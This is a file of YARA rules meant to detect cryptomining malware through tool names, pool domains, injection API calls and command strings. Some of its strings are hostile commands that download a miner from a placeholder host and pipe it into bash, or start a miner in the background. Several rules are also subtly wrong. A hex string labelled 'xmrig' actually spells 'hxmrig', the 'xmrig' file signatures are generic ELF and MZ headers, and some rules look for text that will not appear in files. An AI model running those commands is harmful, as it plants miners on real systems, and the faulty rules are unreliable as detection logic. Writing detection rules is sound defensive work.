rule CryptoMiner_Generic
{
    meta:
        description = "Detects common crypto mining software"
        author = "Your Team"
        version = "1.0"
        date = "2025-02-05"
        category = "Cryptojacking"
    strings:
        // Common cryptominers
        $xmrig = "xmrig"
        $minerd = "minerd"
        $ethminer = "ethminer"
        $ccminer = "ccminer"
        $cgminer = "cgminer"
        $bfgminer = "bfgminer"

        // Common mining pool URLs
        $stratum1 = "stratum+tcp://"
        $stratum2 = "stratum2+tcp://"
        $monero_pool = "pool.minexmr.com"
        $nicehash = "nicehash.com"
        $ethermine = "ethermine.org"

        // Malicious mining commands
        $cmd1 = "nohup ./xmrig"
        $cmd2 = "screen -dmS miner ./xmrig"
        $cmd3 = "wget http://malicious-site.com/malware/xmrig"

    condition:
        any of them
}

rule CryptoMiner_FileSignatures
{
    meta:
        description = "Detects cryptojacking malware based on file signatures"
        author = "Your Team"
    strings:
        // ELF & EXE file signatures of known cryptominers
        $elf_xmrig = { 7F 45 4C 46 02 01 01 00 00 00 00 00 00 00 00 00 02 00 3E 00 }
        $exe_xmrig = { 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 }

    condition:
        any of them
}

rule CryptoMiner_SuspiciousMemoryUsage
{
    meta:
        description = "Detects high CPU/memory usage indicating cryptojacking"
        author = "Your Team"
    strings:
        $cpu_usage = "CPU usage above 90%"
        $memory_usage = "High memory consumption detected"
    condition:
        any of them
}

rule CryptoMiner_ProcessInjection
{
    meta:
        description = "Detects process injection techniques used by cryptojacking malware"
        author = "Your Team"
    strings:
        $injection1 = "VirtualAllocEx"
        $injection2 = "WriteProcessMemory"
        $injection3 = "CreateRemoteThread"
        $injection4 = "SetWindowsHookEx"
    condition:
        any of them
}

rule CryptoMiner_ObfuscatedCode
{
    meta:
        description = "Detects obfuscated or encoded cryptominer code"
        author = "Your Team"
    strings:
        $base64_xmrig = "eG1yaWc="  // Base64 encoded "xmrig"
        $encoded_miner = { 68 78 6D 72 69 67 }  // Hex for 'xmrig'
        $packer1 = "UPX!"
    condition:
        any of them
}

rule CryptoMiner_SuspiciousURLs
{
    meta:
        description = "Detects connections to suspicious crypto mining domains"
        author = "Your Team"
    strings:
        $url1 = "xmrpool.eu"
        $url2 = "monerohash.com"
        $url3 = "supportxmr.com"
        $url4 = "hashvault.pro"
        $url5 = "cryptonight-hash.com"
    condition:
        any of them
}

rule CryptoMiner_Linux_Backdoor
{
    meta:
        description = "Detects Linux-based cryptojacking malware that installs backdoors"
        author = "Your Team"
    strings:
        $linux_miner1 = "nohup ./xmrig"
        $linux_miner2 = "chmod +x xmrig"
        $linux_miner3 = "curl -s -L http://malicious-url.com/xmrig | bash"
    condition:
        any of them
}
